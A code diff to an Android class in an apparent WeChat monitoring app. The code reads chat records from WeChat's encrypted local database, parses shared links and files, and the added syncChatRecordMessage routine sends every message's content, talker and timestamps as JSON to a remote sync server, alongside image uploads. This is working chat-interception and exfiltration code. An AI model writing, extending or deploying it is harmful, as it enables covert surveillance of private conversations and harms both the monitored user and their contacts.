@@ -4,25 +4,45 @@ import android.content.ContentValues;
 import android.content.Context;
 import android.util.Log;
 
+import com.google.gson.Gson;
+import com.google.gson.reflect.TypeToken;
 import com.samego.alic.monitor.wechat.wechatrecord.bean.ChatRecord;
+import com.samego.alic.monitor.wechat.wechatrecord.bean.RequestStructure;
+import com.samego.alic.monitor.wechat.wechatrecord.bean.ResponseStructure;
 import com.samego.alic.monitor.wechat.wechatrecord.common.AppCommon;
 import com.samego.alic.monitor.wechat.wechatrecord.common.AppCore;
+import com.samego.alic.monitor.wechat.wechatrecord.common.ResponseCode;
 import com.samego.alic.monitor.wechat.wechatrecord.configure.TN;
+import com.samego.alic.monitor.wechat.wechatrecord.configure.URI;
 import com.samego.alic.monitor.wechat.wechatrecord.helper.DataBaseHelper;
+import com.samego.alic.monitor.wechat.wechatrecord.helper.OkHttpManager;
 import com.samego.alic.monitor.wechat.wechatrecord.helper.WechatDatabaseHelper;
 import com.samego.alic.monitor.wechat.wechatrecord.libs.WechatPackage;
 import com.samego.alic.monitor.wechat.wechatrecord.model.listener.OnGetChatRecordListener;
 import com.samego.alic.monitor.wechat.wechatrecord.utils.DatabaseManager;
 import com.samego.alic.monitor.wechat.wechatrecord.utils.DevLog;
+import com.samego.alic.monitor.wechat.wechatrecord.utils.SharedPreferencesUtil;
 
 import net.sqlcipher.Cursor;
 import net.sqlcipher.SQLException;
 import net.sqlcipher.database.SQLiteDatabase;
 
+import org.jsoup.Jsoup;
+import org.jsoup.nodes.Document;
+import org.jsoup.nodes.Element;
 
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.FormBody;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
 public class ChatRecordModelImpl implements ChatRecordModel {
     private UploadModel uploadModel;
@@ -75,14 +95,10 @@ public class ChatRecordModelImpl implements ChatRecordModel {
                     switch (chatRecord.getType()) {
                         // 图片
                         case "3":
-                            DevLog.i("3 - 图片");
                             filePath = imagePath(database, chatRecord.getMsgSvrId());
-                            DevLog.i("3" + filePath);
                             link = this.path2link(context, filePath, chatRecord.getMsgSvrId(), chatRecord.getType());
-                            DevLog.i("3" + link);
                             // 上传
                             if (null == link) {
-                                DevLog.i("3 - 异常被注销");
                                 chatRecord = null;
                                 break;
                             }
@@ -127,7 +143,29 @@ public class ChatRecordModelImpl implements ChatRecordModel {
                         // 分享
                         case "49":
                             // xml内容
-                            // 不作处理 - 处理的话服务端处理
+                            Document document;
+                            document = Jsoup.parse(chatRecord.getContent(), "UTF-8");
+                            Element element = document.getElementsByTag("type").get(0);
+                            String shareType = element.text();
+                            switch (shareType) {
+                                case "5":
+                                    chatRecord.setContent("【分享-链接】<a href='" +
+                                            document.getElementsByTag("url").get(0).text() +
+                                            "'>" + document.getElementsByTag("title").get(0).text() +
+                                            "</a>"
+                                    );
+                                    break;
+                                case "6":
+                                    chatRecord.setContent(
+                                            "【分享-文件】" +
+                                                    document.getElementsByTag("title").get(0).text()
+
+                                    );
+                                    break;
+                                default:
+                                    chatRecord.setContent("【分享】未分析到具体内容");
+                                    break;
+                            }
                             break;
 
                         default:
@@ -151,7 +189,6 @@ public class ChatRecordModelImpl implements ChatRecordModel {
         String link = this.readResourceLink(context, msgSvrId, type);
         // 上传
         if (null == link) {
-            DevLog.i("资源文件为空" + msgSvrId);
             if (null != path) {
                 DevLog.i("开始上传" + msgSvrId);
                 link = this.uploadModel.uploadFile(path);
@@ -161,14 +198,37 @@ public class ChatRecordModelImpl implements ChatRecordModel {
                 }
             }
         } else {
-            DevLog.i("库存找到文件路径" + msgSvrId);
+            DevLog.i("资源文件已上传" + msgSvrId);
         }
         return link;
     }
 
     @Override
     public void syncChatRecordMessage(final Context context, final List<ChatRecord> chatRecordList) {
+        String username = SharedPreferencesUtil.get(context, "username", null);
+
+        if (null == username) {
+            return;
+        }
+
+        // 头部header
+        Map<String, Object> header = new HashMap<>();
+        header.put("companyId", "tsb");
+
+        // 主体body
+        Map<String, Object> body = new HashMap<>();
+        List message = new ArrayList();
+
         for (ChatRecord chatRecord : chatRecordList) {
+            Map<String, String> item = new HashMap<>();
+            item.put("msg_svr_id", chatRecord.getMsgSvrId());
+            item.put("is_send", chatRecord.getIsSend());
+            item.put("content", chatRecord.getContent());
+            item.put("type", chatRecord.getType());
+            item.put("talker", chatRecord.getTalker());
+            item.put("create_time", chatRecord.getCreateTime());
+            message.add(item);
+
             Log.i("alicfeng", "MsgSvrId - " + chatRecord.getMsgSvrId());
             Log.i("alicfeng", "IsSend - " + chatRecord.getIsSend());
             Log.i("alicfeng", "Content - " + chatRecord.getContent());
@@ -176,6 +236,37 @@ public class ChatRecordModelImpl implements ChatRecordModel {
             Log.i("alicfeng", "Talker - " + chatRecord.getTalker());
             Log.i("alicfeng", "CreateTime - " + chatRecord.getCreateTime());
         }
+
+        body.put("type", URI.INTERFACE_SIGN_CHATRECORD);
+        body.put("username", username);
+        body.put("message", message);
+
+        RequestStructure structure = new RequestStructure();
+        structure.setHeader(header);
+        structure.setBody(body);
+
+        final Gson gson = new Gson();
+        String json = gson.toJson(structure);
+        //post异步处理 结果是我的装备
+        RequestBody requestBody = FormBody.create(OkHttpManager.MEDIA_TYPE_JSON, json);
+        Log.i("alicfeng", json);
+        OkHttpManager.postEnqueueAsync(URI.URI_CHATRECORD_SYNC, requestBody, new Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+                Log.e("alicfeng - onFailure", e.getMessage());
+            }
+
+            @Override
+            public void onResponse(Call call, Response response) throws IOException {
+                String result = response.body().string();
+                Log.i("alicfeng", result);
+                ResponseStructure responseStructure = gson.fromJson(result, new TypeToken<ResponseStructure>() {
+                }.getType());
+                if (ResponseCode.SUCCESS.equals(responseStructure.getResultCode())) {
+                    Log.i("alicfeng", "聊天信息同步成功");
+                }
+            }
+        });
     }
 
     @Override
